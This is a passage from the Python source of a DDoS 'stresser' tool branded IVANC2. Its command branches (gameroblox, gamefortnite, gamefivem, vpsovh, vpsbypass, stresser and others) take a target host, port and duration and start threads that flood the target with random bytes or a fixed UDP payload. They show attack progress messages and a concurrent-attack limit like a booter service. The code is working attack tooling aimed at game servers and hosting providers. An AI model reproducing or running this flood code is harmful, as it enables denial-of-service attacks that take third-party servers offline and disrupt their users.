					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gamestresser":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gamenfokill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gameroblox":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gamefivem":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gamefortnite":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gamesamp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vps":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vpsbypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vpsovh":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vpsudp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vpsroblox":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vpsfivem":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vpsminecraft":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vpssamp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vpsstresser":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stresser":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stresserbypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
